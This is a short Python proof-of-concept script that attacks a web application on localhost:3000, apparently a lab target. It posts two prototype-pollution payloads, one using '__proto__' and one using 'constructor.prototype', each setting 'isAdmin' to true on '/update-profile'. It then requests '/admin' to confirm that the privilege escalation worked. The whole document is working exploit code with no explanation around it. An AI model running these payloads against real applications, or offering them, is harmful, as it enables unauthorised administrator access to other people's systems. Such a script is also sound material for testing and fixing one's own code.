import http.client, json

def post_json(conn, path, body):
    data = json.dumps(body)
    conn.request("POST", path, data, {"Content-Type": "application/json"})
    res = conn.getresponse()
    out = res.read().decode()
    return res.status, out

conn = http.client.HTTPConnection("localhost", 3000)
print("[-] __proto__ vector")
print(post_json(conn, "/update-profile", {"__proto__": {"isAdmin": True}}))
print("[-] constructor.prototype vector")
print(post_json(conn, "/update-profile", {"constructor": {"prototype": {"isAdmin": True}}}))

conn.request("GET", "/admin")
res = conn.getresponse()
print("[verify] /admin status:", res.status)
print(res.read().decode())